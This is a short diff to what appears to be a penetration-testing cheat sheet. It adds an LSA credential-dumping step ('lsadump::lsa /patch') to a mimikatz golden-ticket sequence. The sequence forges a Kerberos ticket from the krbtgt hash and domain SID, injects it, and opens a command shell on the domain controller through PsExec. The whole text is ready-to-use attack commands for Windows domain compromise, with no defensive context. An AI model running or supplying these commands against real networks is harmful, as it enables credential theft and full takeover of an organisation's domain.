@@ -276,6 +276,7 @@ Golden ticket:
 #start mimikatz
 privilege::debug
 kerberos::purge
+lsadump::lsa /patch
 kerberos::golden /user:$USER /domain:$TARGET_AD /sid:$TARGET_SID /krbtgt:$HASH /ptt
 misc::cmd
 PsExec.exe \\$DOMAIN_CONTROLLER cmd.exe
